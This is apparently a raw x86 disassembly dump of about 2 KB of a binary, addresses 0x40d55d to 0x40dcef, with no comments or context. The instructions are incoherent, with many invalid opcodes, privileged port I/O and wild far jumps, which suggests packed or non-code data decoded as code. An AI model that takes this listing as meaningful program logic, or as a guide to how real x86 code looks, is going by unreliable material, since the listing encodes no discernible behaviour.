  40d55d:	mov    ecx,0xfd80
  40d562:	ins    BYTE PTR es:[edi],dx
  40d563:	shr    eax,cl
  40d565:	xor    ebp,DWORD PTR [esi-0x6e640f02]
  40d56b:	sti    
  40d56c:	fisttp QWORD PTR [esi-0x70c2f96a]
  40d572:	xchg   edi,eax
  40d573:	in     eax,dx
  40d574:	or     DWORD PTR [ebp+eiz*8+0x3b8ec5db],ebx
  40d57b:	push   esp
  40d57c:	xor    al,0xe8
  40d57e:	push   ss
  40d57f:	xor    al,0x2f
  40d581:	inc    ebp
  40d582:	xor    esp,esp
  40d584:	rcr    BYTE PTR [ecx+0x33a57907],0xd9
  40d58b:	adc    ebp,ecx
  40d58d:	sahf   
  40d58e:	pushf  
  40d58f:	jmp    0x40d577
  40d591:	inc    ebp
  40d592:	lock adc edi,DWORD PTR [ecx]
  40d595:	pop    ebp
  40d597:	or     edx,DWORD PTR [ecx+0x7d78be51]
  40d59d:	fwait
  40d59e:	pop    esp
  40d59f:	in     al,0xff
  40d5a1:	jne    0x40d54a
  40d5a3:	jns    0x40d619
  40d5a5:	ins    DWORD PTR es:[edi],dx
  40d5a6:	mov    edi,0x5d510800
  40d5ab:	in     eax,0xfe
  40d5ad:	pop    esi
  40d5ae:	dec    edi
  40d5af:	dec    ebp
  40d5b0:	shr    ebp,0x32
  40d5b3:	loope  0x40d53f
  40d5b5:	cmp    eax,0x74ef53b3
  40d5ba:	jns    0x40d540
  40d5bc:	dec    edi
  40d5bd:	sbb    DWORD PTR ds:[eax],ecx
  40d5c0:	call   0xfeb81b63
  40d5c5:	loop   0x40d5c7
  40d5c7:	add    dl,dh
  40d5c9:	add    esi,DWORD PTR [edx]
  40d5cb:	push   0x41
  40d5cd:	js     0x40d5d0
  40d5cf:	xchg   edi,eax
  40d5d0:	ror    DWORD PTR [edx-0x6af3eebc],cl
  40d5d6:	aaa    
  40d5d7:	mov    ebp,0x61900d0
  40d5dc:	sub    DWORD PTR [edi+edi*8],esp
  40d5df:	je     0x40d59b
  40d5e1:	outs   dx,DWORD PTR ds:[esi]
  40d5e2:	and    eax,0xfe76a799
  40d5e7:	je     0x40d5a7
  40d5e9:	jbe    0x40d65f
  40d5eb:	loope  0x40d5a1
  40d5ed:	add    BYTE PTR [eax],cl
  40d5ef:	rcr    DWORD PTR [edi-0x1c],1
  40d5f2:	(bad)  
  40d5f3:	(bad)  
  40d5f4:	push   ss
  40d5f5:	shr    bh,1
  40d5f7:	cmp    DWORD PTR [ebp-0x4b39a740],ebp
  40d5fd:	dec    esp
  40d5fe:	shr    ebp,0x32
  40d601:	loope  0x40d58d
  40d603:	lds    esi,FWORD PTR [eax+0x3543f753]
  40d609:	jmp    0x51e8:0xc3ea642
  40d610:	and    eax,0xee60fe77
  40d615:	ja     0x40d680
  40d617:	jmp    0xa8ea44
  40d61c:	pop    esi
  40d61d:	rol    DWORD PTR [eax+0x0],1
  40d620:	and    BYTE PTR [edx],dl
  40d622:	add    BYTE PTR [eax],al
  40d624:	enter  0x7097,0x56
  40d628:	lahf   
  40d629:	mov    DWORD PTR [ecx],ecx
  40d62b:	rol    BYTE PTR [eax],0x0
  40d62e:	add    al,0x48
  40d630:	xchg   DWORD PTR [ebp-0x70],eax
  40d633:	sbb    BYTE PTR [edx+0x46],bh
  40d636:	leave  
  40d637:	adc    bh,bh
  40d639:	jne    0x40d69b
  40d63b:	cwde   
  40d63c:	loopne 0x40d663
  40d63e:	sbb    BYTE PTR [ebx],dl
  40d640:	or     eax,eax
  40d642:	les    esi,FWORD PTR [ebx-0x3]
  40d645:	jne    0x40d687
  40d647:	cwde   
  40d648:	add    DWORD PTR [ebp+0x1f],ebx
  40d64b:	mov    DWORD PTR [esi+0x68],ecx
  40d64e:	cmp    cl,BYTE PTR [esi+edi*1+0x0]
  40d652:	rcl    BYTE PTR [edx],0x0
  40d655:	out    dx,eax
  40d656:	jle    0x40d672
  40d658:	add    BYTE PTR [eax+0x3f],dl
  40d65b:	pop    ds
  40d65c:	or     al,ch
  40d65e:	and    BYTE PTR [eax],0xff
  40d661:	jmp    DWORD PTR [eax]
  40d663:	imul   edx,DWORD PTR [ecx-0x1],0xf87387bf
  40d66a:	xor    BYTE PTR [ecx-0x787000af],al
  40d670:	jae    0x40d66e
  40d672:	jg     0x40d691
  40d674:	or     al,ch
  40d676:	adc    al,BYTE PTR [ebx-0x1]
  40d679:	call   ecx
  40d67b:	push   esp
  40d67c:	add    al,BYTE PTR [eax]
  40d67e:	and    eax,0xd483eafd
  40d683:	xchg   BYTE PTR [eax+0x0],ch
  40d686:	repnz retf 
  40d688:	(bad)  
  40d689:	jne    0x40d6db
  40d68b:	call   0x4587:0x878f502c
  40d692:	add    BYTE PTR [eax],al
  40d694:	mov    esp,0x3100001a
  40d699:	mov    cs,WORD PTR [edi+eiz*2-0x44]
  40d69d:	cs inc ebx
  40d69f:	add    cl,bl
  40d6a1:	jmp    0x815:0xf6314144
  40d6a8:	dec    ecx
  40d6a9:	not    BYTE PTR [ebx]
  40d6ab:	jmp    FWORD PTR [esi]
  40d6ad:	out    0x15,eax
  40d6af:	cld    
  40d6b0:	es pop ecx
  40d6b2:	cli    
  40d6b3:	out    0x6e,eax
  40d6b5:	mov    ebx,0x29e8fe8b
  40d6ba:	pop    es
  40d6bb:	add    BYTE PTR [edx+esi*8-0x62],ah
  40d6bf:	sub    ch,0xd3
  40d6c2:	sbb    al,BYTE PTR [eax]
  40d6c4:	xor    esi,eax
  40d6c6:	dec    esp
  40d6c7:	(bad)  
  40d6c8:	jl     0x40d73d
  40d6ca:	call   0x5cfe:0x8c267e42
  40d6d1:	jg     0x40d65e
  40d6d3:	je     0x40d6fe
  40d6d5:	and    ebp,DWORD PTR [ecx+0x4e]
  40d6d8:	(bad)  
  40d6d9:	push   ds
  40d6da:	mov    WORD PTR [ecx+eiz*1+0x6],?
  40d6de:	push   ss
  40d6df:	or     cl,bl
  40d6e1:	(bad)  
  40d6e2:	cmp    edi,edi
  40d6e4:	mov    esi,0xb6181476
  40d6e9:	clc    
  40d6ea:	idiv   dh
  40d6ec:	and    al,0x73
  40d6ee:	call   0x6d67:0x8a6df654
  40d6f5:	sub    eax,0x45
  40d6fa:	xchg   esi,eax
  40d6fb:	fdiv   st,st(3)
  40d6fd:	out    0x54,eax
  40d6ff:	adc    BYTE PTR [eax+eax*1],al
  40d702:	cmp    ch,BYTE PTR [ebx-0x5af69af0]
  40d708:	inc    ecx
  40d709:	inc    ecx
  40d70a:	xor    DWORD PTR [ebx+0xa],edx
  40d70d:	and    esi,DWORD PTR [ecx]
  40d70f:	imul   edi,DWORD PTR [ebx+0x44],0x69
  40d713:	adc    al,0x11
  40d715:	mov    edx,0x8ae8d2f4
  40d71a:	frstor [ebx]
  40d71c:	add    DWORD PTR [ebx],0xfee91414
  40d722:	xchg   BYTE PTR [eax],al
  40d724:	out    dx,eax
  40d725:	push   es
  40d726:	hlt    
  40d727:	jnp    0x40d798
  40d729:	inc    ecx
  40d72a:	and    DWORD PTR [ebp-0x5],esi
  40d72d:	repz push ss
  40d72f:	xchg   edi,eax
  40d730:	add    DWORD PTR [ebx-0x749f6ed9],ecx
  40d736:	mov    ds:0x15417040,al
  40d73b:	in     al,dx
  40d73c:	out    0x3,eax
  40d73e:	push   ds
  40d73f:	mov    dh,0x4d
  40d741:	adc    DWORD PTR [ecx],edi
  40d743:	ins    BYTE PTR es:[edi],dx
  40d744:	xor    edi,DWORD PTR [edx]
  40d746:	(bad)  
  40d747:	je     0x40d786
  40d749:	adc    DWORD PTR ds:0xd6fbbb75,esp
  40d74f:	das    
  40d750:	sahf   
  40d751:	mov    ah,bh
  40d753:	je     0x40d6f0
  40d755:	xchg   edi,ebx
  40d757:	(bad)  
  40d758:	lock fwait
  40d75a:	lahf   
  40d75b:	lds    edx,FWORD PTR ds:0xcf00008b
  40d761:	(bad)  
  40d762:	lock mov bh,BYTE PTR ds:0x29110620
  40d769:	ins    BYTE PTR es:[edi],dx
  40d76a:	sbb    eax,0x1f74b63a
  40d76f:	mov    BYTE PTR [edx+0x14],0x94
  40d773:	jle    0x40d70f
  40d775:	nop
  40d776:	lods   al,BYTE PTR ds:[esi]
  40d777:	mov    eax,DWORD PTR [ecx+edx*4]
  40d77a:	sbb    edi,DWORD PTR [edx+0x3e8d344]
  40d780:	add    eax,0x78c869f8
  40d785:	and    eax,0x310428
  40d78a:	cmp    al,BYTE PTR [edi+0x3635]
  40d790:	hlt    
  40d791:	adc    eax,DWORD PTR [eax]
  40d793:	xor    eax,0xa5444d47
  40d798:	xor    dl,BYTE PTR [eax+eax*1]
  40d79b:	jmp    0xea38a713
  40d7a0:	xor    dl,BYTE PTR [eax+eax*1]
  40d7a3:	pop    esp
  40d7a4:	icebp  
  40d7a5:	ja     0x40d7f6
  40d7a7:	je     0x40d79a
  40d7a9:	jnp    0x40d7fa
  40d7ab:	adc    ebp,DWORD PTR ds:0x742f96ec
  40d7b1:	adc    al,0xff
  40d7b3:	aam    0xe4
  40d7b5:	inc    ecx
  40d7b6:	inc    ecx
  40d7b7:	jmp    0xaab48bdb
  40d7bc:	scas   eax,DWORD PTR es:[edi]
  40d7bd:	lock imul ecx
  40d7c0:	xor    DWORD PTR ds:[ebx-0x51ffff34],eax
  40d7c7:	jae    0x40d83b
  40d7c9:	(bad)  
  40d7ca:	jg     0x40d7b4
  40d7cc:	sti    
  40d7cd:	push   edx
  40d7ce:	or     dl,cl
  40d7d0:	mov    bh,bh
  40d7d2:	mov    ebx,0x402e17e9
  40d7d7:	adc    bh,bh
  40d7d9:	lahf   
  40d7da:	fidiv  DWORD PTR [edx+0x75]
  40d7dd:	fldcw  WORD PTR [ebx-0x67fef818]
  40d7e3:	jno    0x40d7e3
  40d7e5:	push   cs
  40d7e6:	sbb    BYTE PTR [ebx+0x4c],dh
  40d7e9:	add    DWORD PTR [edi+0x296a0359],esi
  40d7ef:	ins    BYTE PTR es:[edi],dx
  40d7f0:	(bad)  
  40d7f1:	jl     0x40d824
  40d7f3:	xchg   edi,eax
  40d7f4:	cmp    eax,0xfe4b41e9
  40d7f9:	pop    esp
  40d7fa:	test   eax,0x7baf1472
  40d7ff:	aam    0xff
  40d801:	ss retf 0x355
  40d805:	jmp    0x12c7761
  40d80a:	or     edx,DWORD PTR [edx+esi*8+0x53]
  40d80e:	iret   
  40d80f:	xor    edi,eax
  40d811:	add    BYTE PTR [eax+0x17],bl
  40d814:	add    bh,al
  40d816:	or     eax,0x48fffe84
  40d81b:	pop    ss
  40d81c:	push   DWORD PTR [ebp+0x58]
  40d81f:	in     al,dx
  40d820:	inc    ebx
  40d821:	cld    
  40d822:	mov    DWORD PTR [ebx],ecx
  40d824:	cld    
  40d825:	push   0x58
  40d827:	adc    DWORD PTR [eax],eax
  40d829:	push   0x0
  40d82b:	add    BYTE PTR [eax+0x11],cl
  40d82e:	add    bh,bh
  40d830:	cmp    eax,0x1475fd9b
  40d835:	adc    DWORD PTR [eax],eax
  40d837:	push   0x18
  40d839:	(bad)
  40d83d:	pop    ss
  40d83e:	or     eax,eax
  40d840:	cld    
  40d841:	popa   
  40d842:	dec    esi
  40d843:	push   eax
  40d844:	jo     0x40d880
  40d846:	push   ecx
  40d847:	push   DWORD PTR [edi-0x11]
  40d84a:	inc    ebx
  40d84b:	clc    
  40d84c:	rcl    DWORD PTR [eax],1
  40d84e:	add    BYTE PTR [edx+0x8],ch
  40d851:	push   DWORD PTR es:[ebp+0x20]
  40d855:	popf   
  40d856:	jae    0x40d854
  40d858:	pop    ss
  40d859:	and    ecx,DWORD PTR [edx+ebp*2]
  40d85c:	enter  0x10,0xe8
  40d860:	outs   dx,BYTE PTR ds:[esi]
  40d861:	jp     0x40d861
  40d863:	call   ebx
  40d865:	push   esi
  40d866:	jae    0x40d877
  40d868:	aaa    
  40d869:	and    edi,eax
  40d86b:	call   0x3ffe5c
  40d870:	rdpmc  
  40d872:	clc    
  40d873:	add    BYTE PTR [eax+0x15830016],bl
  40d879:	lahf   
  40d87a:	(bad)  
  40d87b:	jae    0x40d8e3
  40d87d:	popf   
  40d87e:	jae    0x40d888
  40d880:	ja     0x40d8a3
  40d882:	clc    
  40d883:	call   0x246db9
  40d888:	xchg   BYTE PTR [ebp-0x3e],dh
  40d88b:	jae    0x40d8cb
  40d88d:	or     eax,0x7489
  40d892:	sub    DWORD PTR [ebp+0x3],eax
  40d895:	and    dh,BYTE PTR [ecx]
  40d897:	jge    0x40d8c2
  40d899:	add    esi,DWORD PTR [eax-0xb]
  40d89c:	stos   BYTE PTR es:[edi],al
  40d89d:	jmp    0x58dc:0xccafd0b
  40d8a4:	sar    bh,0x4e
  40d8a7:	sub    eax,0x7d10ed9c
  40d8ac:	add    cl,BYTE PTR [ebx]
  40d8ae:	jno    0x40d920
  40d8b0:	in     eax,dx
  40d8b1:	dec    edi
  40d8b2:	loope  0x40d838
  40d8b4:	nop
  40d8b5:	dec    edi
  40d8b6:	cs jmp 0x40d932
  40d8b9:	inc    esp
  40d8ba:	sbb    eax,0xa4ff3305
  40d8bf:	iret   
  40d8c0:	xor    ebp,eax
  40d8c2:	lods   al,BYTE PTR ss:[esi]
  40d8c4:	xchg   esi,edi
  40d8c6:	sbb    al,BYTE PTR [edx+0x7b498042]
  40d8cc:	or     eax,0x8ab0fed1
  40d8d1:	out    0xf0,eax
  40d8d3:	mov    eax,DWORD PTR [edi-0x713f4502]
  40d8d9:	pop    edx
  40d8da:	clc    
  40d8db:	cmp    eax,0xe685fff7
  40d8e0:	xchg   esi,eax
  40d8e1:	sub    ch,0x27
  40d8e4:	xor    DWORD PTR [edi-0x4e],edx
  40d8e7:	dec    eax
  40d8e8:	enter  0x7028,0x7b
  40d8ec:	add    dh,BYTE PTR [ebp+0x37]
  40d8ef:	mov    edx,0x7ff3c928
  40d8f4:	add    cl,BYTE PTR [ebp+0x6af40000]
  40d8fa:	xor    edi,edi
  40d8fc:	sbb    al,0x4f
  40d8fe:	call   0x2b87:0xe6140730
  40d905:	push   esp
  40d906:	in     eax,dx
  40d907:	jg     0x40d966
  40d909:	adc    ebp,ecx
  40d90b:	add    esi,DWORD PTR [eax+0x3104ccef]
  40d911:	add    al,0xe9
  40d913:	div    BYTE PTR [ebx+0x3103e809]
  40d919:	jno    0x40d956
  40d91b:	mov    BYTE PTR [edi-0x19],ah
  40d91e:	mov    al,0x9c
  40d920:	call   0xed54:0x2b87a5cb
  40d927:	xor    BYTE PTR [edx],0x13
  40d92a:	jmp    0x8d281f32
  40d92f:	xchg   ebp,eax
  40d931:	imul   edx,DWORD PTR [eax],0x54
  40d934:	in     al,dx
  40d935:	shr    al,cl
  40d937:	fwait
  40d938:	add    esi,DWORD PTR [edx+0x75]
  40d93b:	xchg   DWORD PTR [ecx-0x5a78832a],edi
  40d941:	jo     0x40d9a8
  40d943:	adc    DWORD PTR [ecx],ebx
  40d945:	cld    
  40d946:	xchg   DWORD PTR [esi],edi
  40d948:	jo     0x40d95e
  40d94a:	inc    ecx
  40d94b:	les    eax,FWORD PTR [ecx+esi*2]
  40d94e:	dec    ebp
  40d94f:	jge    0x40d9c6
  40d951:	jl     0x40d998
  40d953:	adc    ebp,esi
  40d955:	jo     0x40d90a
  40d957:	mov    edx,DWORD PTR [esi-0x50]
  40d95a:	scas   al,BYTE PTR es:[edi]
  40d95b:	inc    esp
  40d95c:	add    BYTE PTR [eax],al
  40d95e:	xor    DWORD PTR [ebx+edi*2-0x7a],edi
  40d962:	fbstp  TBYTE PTR [eax+0x6f]
  40d965:	inc    ecx
  40d966:	int    0x94
  40d968:	fwait
  40d969:	xchg   edi,eax
  40d96a:	into   
  40d96b:	and    DWORD PTR [ebp+0x5d],ebp
  40d96e:	(bad)  
  40d96f:	jo     0x40d959
  40d971:	cmp    BYTE PTR ds:0xb2f6e87c,0x90
  40d978:	call   0xffd60a80
  40d97d:	jae    0x40d945
  40d97f:	jo     0x40d98e
  40d981:	and    BYTE PTR gs:[ecx-0x2],dh
  40d985:	jmp    0xd228c139
  40d98a:	xor    DWORD PTR [ebx],0x0
  40d98d:	jmp    0x6328c19d
  40d992:	mov    ah,0x9d
  40d994:	(bad)  
  40d995:	cwde   
  40d996:	xchg   ebp,eax
  40d997:	ret    
  40d998:	jmp    0x40f9:0x3bbf4f0f
  40d99f:	sbb    al,0x3c
  40d9a1:	lock das 
  40d9a3:	sbb    BYTE PTR [ecx+ebx*8],ch
  40d9a6:	mov    ebx,0x31282c14
  40d9ab:	push   ds
  40d9ac:	adc    BYTE PTR [ebp+0x6909e262],0xb6
  40d9b3:	sub    esi,DWORD PTR [edi-0x14]
  40d9b6:	mov    dl,0x7c
  40d9b8:	das    
  40d9b9:	xchg   edx,eax
  40d9ba:	sub    al,0xf0
  40d9bc:	jmp    0x40d9e6
  40d9be:	lods   eax,DWORD PTR ds:[esi]
  40d9bf:	push   ebx
  40d9c0:	or     DWORD PTR [ecx+0x13d20000],ebp
  40d9c6:	or     ch,BYTE PTR ds:0x300adc78
  40d9cc:	and    DWORD PTR [esi+0x58],ebx
  40d9cf:	pusha  
  40d9d0:	dec    ecx
  40d9d1:	push   eax
  40d9d2:	(bad)  
  40d9d3:	aam    0x9a
  40d9d5:	sahf   
  40d9d6:	inc    esp
  40d9d7:	dec    ecx
  40d9d8:	mov    bh,0xd8
  40d9da:	xlat   BYTE PTR ds:[ebx]
  40d9db:	jmp    0x6440ee12
  40d9e0:	jno    0x40da2a
  40d9e2:	dec    edi
  40d9e3:	ret    
  40d9e4:	xor    eax,0x3292fffa
  40d9e9:	cli    
  40d9ea:	call   DWORD PTR [edx+0x3544a132]
  40d9f0:	add    ch,BYTE PTR [edi+0x14]
  40d9f3:	iret   
  40d9f4:	fst    st(4)
  40d9f6:	(bad)  
  40d9f7:	inc    ebx
  40d9f9:	push   ebx
  40d9fa:	jb     0x40da1e
  40d9fc:	sbb    ebx,DWORD PTR [eax+ebx*8]
  40d9ff:	add    BYTE PTR [edi+esi*2],ah
  40da02:	std    
  40da03:	jne    0x40da49
  40da05:	xchg   esi,eax
  40da06:	jae    0x40d9e0
  40da08:	(bad)  
  40da09:	pop    ds
  40da0a:	in     al,0xff
  40da0c:	in     eax,0x8b
  40da0e:	std    
  40da0f:	jne    0x40d9a1
  40da11:	mov    edi,DWORD PTR [ebx-0x2669004]
  40da17:	jne    0x40d9e9
  40da19:	nop
  40da1a:	xchg   esi,eax
  40da1b:	and    BYTE PTR [eax+0x13],bl
  40da1e:	push   DWORD PTR [ebp+0x6c]
  40da21:	nop
  40da22:	js     0x40da73
  40da24:	(bad)  
  40da25:	cdq    
  40da26:	std    
  40da27:	jne    0x40da29
  40da29:	add    al,al
  40da2b:	nop
  40da2c:	jo     0x40da7d
  40da2e:	scas   eax,DWORD PTR es:[edi]
  40da2f:	cdq    
  40da30:	std    
  40da31:	jne    0x40d9e7
  40da33:	nop
  40da34:	push   0x8b99af4f
  40da39:	inc    ebp
  40da3a:	mov    eax,0x4590e827
  40da3f:	cdq    
  40da40:	std    
  40da41:	pop    edi
  40da42:	ds stos DWORD PTR es:[edi],eax
  40da44:	ror    BYTE PTR [eax+ecx*1],0x3e
  40da48:	mov    ebp,esp
  40da4a:	mov    edx,DWORD PTR [edx+edi*8+0x6a]
  40da4e:	sbb    BYTE PTR ds:0x6ae5ff45,cl
  40da54:	out    0x81,al
  40da56:	pushf  
  40da57:	xchg   edi,eax
  40da58:	std    
  40da59:	mov    ebp,eax
  40da5b:	xchg   esi,eax
  40da5c:	std    
  40da5d:	jne    0x40da3f
  40da5f:	mov    ah,BYTE PTR [eax]
  40da61:	std    
  40da62:	pop    ds
  40da63:	cdq    
  40da64:	push   0x51ee7005
  40da69:	dec    DWORD PTR [edi]
  40da6b:	ins    DWORD PTR es:[edi],dx
  40da6c:	mov    esi,0x6822ce74
  40da71:	div    DWORD PTR [ecx]
  40da73:	ds inc esp
  40da75:	add    BYTE PTR [ecx+0x7d],cl
  40da78:	add    ch,bh
  40da7a:	ja     0x40da00
  40da7c:	jo     0x40dac3
  40da7e:	lock jl 0x40dab3
  40da81:	call   FWORD PTR [esi*2+0x7e233d9a]
  40da88:	and    edi,0x3c
  40da8b:	es test esi,edi
  40da8e:	add    BYTE PTR [eax],al
  40da90:	mov    es,edi
  40da92:	xchg   esi,edi
  40da94:	cld    
  40da95:	je     0x40da31
  40da97:	xchg   ebp,ebp
  40da99:	pop    ebp
  40da9a:	or     eax,0x73
  40da9d:	add    BYTE PTR [edx],0x55
  40daa0:	mov    edx,0x65c37f60
  40daa5:	or     eax,0x36cb001a
  40daaa:	test   DWORD PTR [ecx+ebp*1-0x7b],esi
  40daae:	xlat   BYTE PTR ds:[ebx]
  40daaf:	dec    ebx
  40dab0:	dec    esi
  40dab1:	lea    edi,[ecx+0x44]
  40dab4:	inc    ebp
  40dab5:	icebp  
  40dab6:	lds    esi,FWORD PTR [ecx+ecx*1+0x3c]
  40daba:	add    al,0x80
  40dabc:	idiv   BYTE PTR [esi+ecx*1+0x51]
  40dac0:	cdq    
  40dac1:	mov    ?,WORD PTR [ecx+eax*2]
  40dac4:	xor    DWORD PTR [esi],ecx
  40dac6:	pushf  
  40dac7:	jne    0x40db19
  40dac9:	jnp    0x40dacd
  40dacb:	or     esi,ecx
  40dacd:	dec    edi
  40dace:	add    bl,ch
  40dad0:	ds inc ebx
  40dad2:	stos   DWORD PTR es:[edi],eax
  40dad3:	inc    ebp
  40dad4:	jo     0x40db51
  40dad6:	sub    ebp,eax
  40dad8:	xchg   esp,eax
  40dad9:	sbb    al,0x4
  40dadb:	add    BYTE PTR [edx],ch
  40dadd:	cmp    ecx,DWORD PTR [edi]
  40dadf:	and    eax,DWORD PTR [esi-0x19a8853d]
  40dae5:	es clc 
  40dae7:	mov    edi,0x68324465
  40daec:	xor    DWORD PTR [ecx+ebp*8],edx
  40daef:	xchg   esp,eax
  40daf0:	mov    esp,?
  40daf2:	push   es
  40daf3:	cmp    eax,0x14700000
  40daf8:	mov    ecx,0x11c4584
  40dafd:	or     eax,0x9b056d42
  40db02:	rcr    dh,1
  40db04:	std    
  40db05:	sub    DWORD PTR [edx-0x60b5d6df],0x6d
  40db0c:	in     eax,dx
  40db0d:	and    DWORD PTR [eax+0x40b20be],0xffffffbd
  40db14:	(bad)  
  40db16:	mov    ch,BYTE PTR [ebp+0x5b]
  40db19:	or     al,0x89
  40db1b:	adc    eax,0xcd77831d
  40db20:	scas   eax,DWORD PTR es:[edi]
  40db21:	inc    esi
  40db22:	xor    dl,BYTE PTR [esp+edx*1]
  40db25:	(bad)  
  40db26:	pop    edx
  40db27:	xchg   ebx,eax
  40db28:	lods   al,BYTE PTR ds:[esi]
  40db29:	push   esp
  40db2a:	ins    DWORD PTR es:[di],dx
  40db2c:	lods   eax,DWORD PTR ds:[esi]
  40db2d:	xchg   ecx,eax
  40db2e:	in     eax,dx
  40db2f:	outs   dx,DWORD PTR ds:[esi]
  40db30:	cmp    BYTE PTR [ebx-0x661fc3b],al
  40db36:	cmp    bh,BYTE PTR [esp+eiz*4+0x24]
  40db3a:	xor    DWORD PTR [edx+eiz*8],edx
  40db3d:	inc    ebx
  40db3e:	daa    
  40db3f:	xchg   edi,eax
  40db40:	mov    ebx,0xa6143105
  40db45:	leave  
  40db46:	push   ds
  40db47:	adc    al,0xe9
  40db49:	add    esi,DWORD PTR [ecx]
  40db4b:	push   ebp
  40db4c:	and    esi,DWORD PTR [edi+edx*1+0x15]
  40db50:	jmp    0xd3557658
  40db55:	add    ebx,DWORD PTR [ebx+0x3c314]
  40db5b:	add    BYTE PTR [esi+edx*8-0x695a2ba8],ch
  40db62:	cmp    BYTE PTR [ebx-0x11],bh
  40db65:	ins    BYTE PTR es:[edi],dx
  40db66:	cwde   
  40db67:	sbb    BYTE PTR [ebp+0x6c],0xff
  40db6b:	xor    eax,0x4fe768d8
  40db70:	or     eax,0x72f20014
  40db75:	loope  0x40db7b
  40db77:	adc    BYTE PTR [ebp+0x14],al
  40db7a:	add    cl,ch
  40db7c:	retf   0x275f
  40db7f:	test   al,0x32
  40db81:	ins    DWORD PTR es:[edi],dx
  40db82:	je     0x40db5d
  40db84:	sbb    dl,BYTE PTR [eax+edx*2-0x2]
  40db88:	mov    bl,0xdc
  40db8a:	mov    bl,BYTE PTR [ecx]
  40db8c:	rcl    BYTE PTR [edi+0x6db3f6ef],0x4f
  40db93:	cmp    ebx,DWORD PTR ds:0xb3de50a4
  40db99:	fwait
  40db9a:	test   ch,al
  40db9c:	sti    
  40db9d:	ins    DWORD PTR es:[edi],dx
  40db9e:	inc    cl
  40dba0:	sub    ebx,esi
  40dba2:	inc    dh
  40dba4:	rcl    edi,0xf3
  40dba7:	sbb    DWORD PTR [ebp-0x30],edx
  40dbaa:	inc    esi
  40dbab:	sub    BYTE PTR ds:0xdbbdb46d,dh
  40dbb1:	ins    DWORD PTR es:[edi],dx
  40dbb2:	(bad)  
  40dbb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dbb4:	dec    ecx
  40dbb5:	sbb    al,ch
  40dbb7:	icebp  
  40dbb8:	pop    ebp
  40dbb9:	ins    DWORD PTR es:[edi],dx
  40dbba:	(bad)  
  40dbbb:	pusha  
  40dbbc:	test   eax,0x8ef644
  40dbc1:	add    BYTE PTR [ebx+0x10fffa],dh
  40dbc7:	rol    DWORD PTR [eax-0x17],cl
  40dbca:	mov    bl,0xa0
  40dbcc:	jmp    0x40dc4c
  40dbce:	mov    bl,0x6a
  40dbd0:	(bad)  
  40dbd1:	hlt    
  40dbd2:	es jl  0x40dbc1
  40dbd5:	mov    ecx,0x64886ab3
  40dbda:	call   0x666c:0xc56fe62
  40dbe1:	mov    cl,0xeb
  40dbe3:	aam    0xff
  40dbe5:	push   DWORD PTR [edi-0x54]
  40dbe8:	jmp    0xd475:0xfd9627f7
  40dbef:	call   eax
  40dbf1:	push   eax
  40dbf2:	pop    es
  40dbf3:	xchg   esi,eax
  40dbf4:	xchg   DWORD PTR [ebp-0x211c4],eax
  40dbfa:	push   ebp
  40dbfb:	pushf  
  40dbfc:	shl    bh,cl
  40dbfe:	daa    
  40dbff:	xchg   esi,eax
  40dc00:	dec    esi
  40dc01:	push   0x3f5e98
  40dc06:	aaa    
  40dc07:	lods   al,BYTE PTR ds:[esi]
  40dc08:	jmp    0x9475:0xfd95a7f7
  40dc0f:	push   DWORD PTR [eax+0x9958750]
  40dc15:	shr    ah,0xe
  40dc18:	cmp    DWORD PTR [ebp-0x21244],0xffffff8c
  40dc1f:	bound  ecx,QWORD PTR [esi]
  40dc21:	call   FWORD PTR [eax]
  40dc23:	test   DWORD PTR [ebx-0x50ffff20],eax
  40dc29:	xchg   ebp,eax
  40dc2a:	std    
  40dc2b:	push   eax
  40dc2c:	adc    BYTE PTR ds:0xf9a7ff4d,0x12
  40dc33:	or     ecx,DWORD PTR [eax-0x5faffb94]
  40dc39:	popa   
  40dc3a:	dec    ebx
  40dc3b:	jmp    DWORD PTR [edi-0x601f7c23]
  40dc41:	xchg   ebp,eax
  40dc42:	std    
  40dc43:	adc    eax,0x6a001748
  40dc48:	sbb    BYTE PTR [edi+0x5d],bh
  40dc4b:	inc    edi
  40dc4c:	pop    ecx
  40dc4d:	adc    bh,bh
  40dc4f:	mov    ch,0xb4
  40dc51:	in     al,dx
  40dc52:	std    
  40dc53:	inc    DWORD PTR [edi-0x1b17f59d]
  40dc59:	inc    esi
  40dc5a:	std    
  40dc5b:	inc    DWORD PTR [ecx+0x31f7da93]
  40dc61:	ret    0x6980
  40dc64:	xor    DWORD PTR [ebp-0x5],edx
  40dc67:	inc    esi
  40dc68:	jo     0x40dce7
  40dc6a:	jg     0x40dc20
  40dc6c:	aad    0x21
  40dc6e:	cmp    esi,0xe80ea7de
  40dc74:	or     BYTE PTR [ebp-0x8470181],0x53
  40dc7b:	test   dh,0x9
  40dc7e:	test   DWORD PTR [ecx+ebx*8+0x31fe8109],edi
  40dc85:	dec    edx
  40dc86:	xchg   BYTE PTR [ebx+0x68027d31],dl
  40dc8c:	add    BYTE PTR [eax],al
  40dc8e:	scas   eax,DWORD PTR es:[edi]
  40dc8f:	mov    cl,0xc1
  40dc91:	jmp    FWORD PTR [ebp-0x69b08949]
  40dc97:	pop    ds
  40dc98:	pop    esp
  40dc99:	test   BYTE PTR [esi+0x36b6a71],0x4a
  40dca0:	jg     0x40dcac
  40dca2:	jno    0x40dc6c
  40dca4:	inc    DWORD PTR [edx+0x740240f4]
  40dcaa:	out    0xfd,eax
  40dcac:	mov    ebp,0x7fa95ee3
  40dcb1:	jmp    edx
  40dcb3:	iret   
  40dcb4:	test   BYTE PTR [ecx+ecx*2+0x31fe7fa1],bh
  40dcbb:	or     eax,ebp
  40dcbd:	and    DWORD PTR [di+0x6f],edi
  40dcc1:	mov    ebp,0xe80c073e
  40dcc6:	ret    
  40dcc7:	xor    eax,DWORD PTR [ecx+0x6b292efe]
  40dccd:	mul    BYTE PTR [esi]
  40dccf:	jmp    0x40dd50
  40dcd1:	je     0x40dcfc
  40dcd3:	xchg   ebx,eax
  40dcd4:	dec    eax
  40dcd5:	dec    eax
  40dcd6:	push   ss
  40dcd7:	sti    
  40dcd8:	jg     0x40dc8e
  40dcda:	adc    eax,0x7805e15
  40dcdf:	push   0xffffffd3
  40dce1:	or     ecx,DWORD PTR [ecx]
  40dce3:	lods   eax,DWORD PTR ds:[esi]
  40dce4:	lahf   
  40dce5:	xor    bh,0x69
  40dce8:	shl    DWORD PTR [edi-0x11],cl
  40dceb:	lahf   
  40dcec:	and    BYTE PTR [eax-0x19],bh
  40dcef:	imul   edi,DWORD PTR ds:0x360000f6,0xd7cab17c
